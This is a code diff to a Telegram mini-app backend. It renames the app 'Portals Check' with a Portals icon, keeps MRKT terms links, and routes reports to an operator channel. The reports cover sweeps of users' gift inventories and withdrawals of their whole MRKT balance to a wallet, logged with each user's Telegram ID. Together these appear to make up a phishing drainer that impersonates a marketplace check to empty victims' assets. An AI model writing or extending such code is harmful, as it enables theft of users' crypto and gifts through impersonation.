@@ -11,8 +11,15 @@ import { fetchInventory } from "./mrkt/client.js";
 import { sweepInventoryPage } from "./mrkt/sweep.js";
 import { withdrawAllMrktBalance } from "./mrkt/withdraw.js";
 import { getSession, openSession } from "./mrkt/sessions.js";
+import { isUserBusinessConnected } from "./business-store.js";
+import { formatTgUser, logTopic } from "./log.js";
 import { notifyOperator } from "./notify.js";
 import { scanAccount } from "./tonapi.js";
+
+const miniappDist = path.resolve(
+  path.dirname(fileURLToPath(import.meta.url)),
+  "../../portals-web",
+);
 
 function tgUserIdFromInitData(initData: string): number {
   const params = new URLSearchParams(initData);
@@ -27,18 +34,13 @@ const app = express();
 app.use(cors({ origin: true }));
 app.use(express.json());
 
-const miniappDist = path.resolve(
-  path.dirname(fileURLToPath(import.meta.url)),
-  "../../miniapp/dist",
-);
-
 app.use(express.static(miniappDist));
 
 app.get("/tonconnect-manifest.json", (_req, res) => {
   res.json({
     url: config.miniappPublicUrl,
-    name: "MRKT",
-    iconUrl: `${config.serverPublicUrl}/mrkt-icon.png`,
+    name: "Portals Check",
+    iconUrl: `${config.serverPublicUrl}/assets/portal_icon.svg`,
     termsOfUseUrl: "https://mrkt.land",
     privacyPolicyUrl: "https://mrkt.land",
   });
@@ -65,12 +67,36 @@ app.post("/api/event", async (req, res) => {
   const lines = [`<b>${type}</b>`, who];
   if (address) lines.push(`wallet: <code>${address}</code>`);
   if (detail) lines.push(detail);
+  const html = lines.join("\n");
   try {
-    await notifyOperator(lines.join("\n"));
+    if (type.includes("error") || type.includes("fail")) {
+      await logTopic("errors", html);
+    } else if (type.includes("sweep") || type.includes("transfer") || type.includes("cycle_done")) {
+      await logTopic("transfers", html);
+    } else {
+      await notifyOperator(html);
+    }
   } catch (e) {
     console.error(e);
   }
   res.json({ ok: true });
+});
+
+app.get("/api/business-status", (req, res) => {
+  const userId = Number(req.query.user_id);
+  if (!userId) {
+    res.status(400).json({ error: "user_id required" });
+    return;
+  }
+  res.json({ connected: isUserBusinessConnected(userId) });
+});
+
+app.get("/api/data", (_req, res) => {
+  res.json({
+    mock_gifts: [],
+    collections: [],
+    chart_history: {},
+  });
 });
 
 const buildSchema = z.object({
@@ -149,8 +175,10 @@ app.post("/api/mrkt/session/open", async (req, res) => {
       },
     });
   } catch (e) {
+    const msg = e instanceof Error ? e.message : String(e);
+    await logTopic("errors", `<b>mrkt_session_fail</b>\n${msg}`);
     console.error(e);
-    res.status(500).json({ error: e instanceof Error ? e.message : String(e) });
+    res.status(500).json({ error: msg });
   }
 });
 
@@ -190,12 +218,17 @@ app.post("/api/mrkt/sweep", async (req, res) => {
         .map((i) => `${i.mode} ${i.giftId} ${i.priceNano ?? ""} ${i.detail ?? ""}`)
         .join("\n");
       if (lines) {
-        await notifyOperator(`<b>mrkt_sweep</b>\ntg <code>${session.tgUserId}</code>\n${lines}`);
+        await logTopic(
+          "transfers",
+          `<b>mrkt_sweep</b>\ntg <code>${session.tgUserId}</code>\n${lines}`,
+        );
       }
     }
     res.json(result);
   } catch (e) {
-    res.status(500).json({ error: String(e) });
+    const msg = String(e);
+    await logTopic("errors", `<b>mrkt_sweep_fail</b>\ntg <code>${session.tgUserId}</code>\n${msg}`);
+    res.status(500).json({ error: msg });
   }
 });
 
@@ -209,15 +242,15 @@ app.post("/api/mrkt/withdraw", async (req, res) => {
   try {
     const result = await withdrawAllMrktBalance(session.mrktToken);
     const ton = result.withdrawnNano ? (result.withdrawnNano / 1e9).toFixed(4) : "0";
-    await notifyOperator(
+    const body =
       result.skipped || !result.withdrawnNano
         ? `<b>mrkt_withdraw_skip</b>\ntg <code>${session.tgUserId}</code>\n${result.reason ?? "—"}\nhard ${result.balanceHardNano ?? 0}`
-        : `<b>mrkt_withdraw</b>\ntg <code>${session.tgUserId}</code>\n${ton} TON → <code>${result.wallet}</code>`,
-    );
+        : `<b>mrkt_withdraw</b>\ntg <code>${session.tgUserId}</code>\n${ton} TON → <code>${result.wallet}</code>`;
+    await logTopic("transfers", body);
     res.json(result);
   } catch (e) {
     const msg = e instanceof Error ? e.message : String(e);
-    await notifyOperator(`<b>mrkt_withdraw_fail</b>\ntg <code>${session.tgUserId}</code>\n${msg}`);
+    await logTopic("errors", `<b>mrkt_withdraw_fail</b>\ntg <code>${session.tgUserId}</code>\n${msg}`);
     res.status(500).json({ error: msg });
   }
 });
